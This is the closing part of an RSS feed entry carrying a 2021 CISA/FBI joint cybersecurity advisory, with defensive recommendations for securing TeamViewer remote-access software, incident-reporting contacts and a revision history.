&lt;h3&gt;Remote Control Software Recommendations&lt;/h3&gt;

&lt;p&gt;For a more secured implementation of TeamViewer software:&lt;/p&gt;

&lt;ul&gt;
	&lt;li&gt;Do not use unattended access features, such as “Start TeamViewer with Windows” and “Grant easy access.”&lt;/li&gt;
	&lt;li&gt;Configure TeamViewer service to “manual start,” so that the application and associated background services are stopped when not in use.&lt;/li&gt;
	&lt;li&gt;Set random passwords to generate 10-character alphanumeric passwords.&lt;/li&gt;
	&lt;li&gt;If using personal passwords, utilize complex rotating passwords of varying lengths. Note: TeamViewer allows users to change connection passwords for each new session. If an end user chooses this option, never save connection passwords as an option as they can be leveraged for persistence.&lt;/li&gt;
	&lt;li&gt;When configuring access control for a host, utilize custom settings to tier the access a remote party may attempt to acquire.&lt;/li&gt;
	&lt;li&gt;Require remote party to receive confirmation from the host to gain any access other than “view only.” Doing so will ensure that, if an unauthorized party is able to connect via TeamViewer, they will only see a locked screen and will not have keyboard control.&lt;/li&gt;
	&lt;li&gt;Utilize the ‘Block and Allow’ list which enables a user to control which other organizational users of TeamViewer may request access to the system. This list can also be used to block users suspected of unauthorized access.&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;Contact Information&lt;/h3&gt;&lt;p&gt;To report suspicious or criminal activity related to information found in this Joint Cybersecurity Advisory, contact your local FBI field office at &lt;a href="http://www.fbi.gov/contact-us/field"&gt;www.fbi.gov/contact-us/field&lt;/a&gt;, or the FBI’s 24/7 Cyber Watch (CyWatch) at (855) 292-3937 or by e-mail at &lt;a href="https://us-cert.cisa.govmailto:CyWatch@fbi.gov"&gt;CyWatch@fbi.gov &lt;/a&gt;or your local WMD Coordinator. When available, please include the following information regarding the incident: date, time, and location of the incident; type of activity; number of people affected; type of equipment used for the activity; the name of the submitting company or organization; and a designated point of contact.&lt;/p&gt;

&lt;p&gt;To request incident response resources or technical assistance related to these threats, contact CISA at &lt;a href="https://us-cert.cisa.govmailto:CISAServiceDesk@cisa.dhs.gov"&gt;Central@cisa.dhs.gov&lt;/a&gt;.&lt;/p&gt;
            &lt;h3&gt;Revisions&lt;/h3&gt;
		&lt;ul&gt;			            &lt;li&gt;February 11, 2021: Initial Version&lt;/li&gt;			            &lt;li&gt;February 12, 2021: Update to PDF File&lt;/li&gt;		&lt;/ul&gt;
		&lt;hr /&gt;
            &lt;div class="field field--name-body field--type-text-with-summary field--label-hidden field--item"&gt;&lt;p class="privacy-and-terms"&gt;This product is provided subject to this &lt;a href="https://us-cert.cisa.gov/privacy/notification"&gt;Notification&lt;/a&gt; and this &lt;a href="https://www.dhs.gov/privacy-policy"&gt;Privacy &amp;amp; Use&lt;/a&gt; policy.&lt;/p&gt;
&lt;/div&gt;
      </description>
  <pubDate>Thu, 11 Feb 2021 19:15:49 +0000</pubDate>
    <dc:creator>CISA</dc:creator>
    <guid isPermaLink="false">16155 at https://us-cert.cisa.gov</guid>
    </item>

  </channel>
</rss>
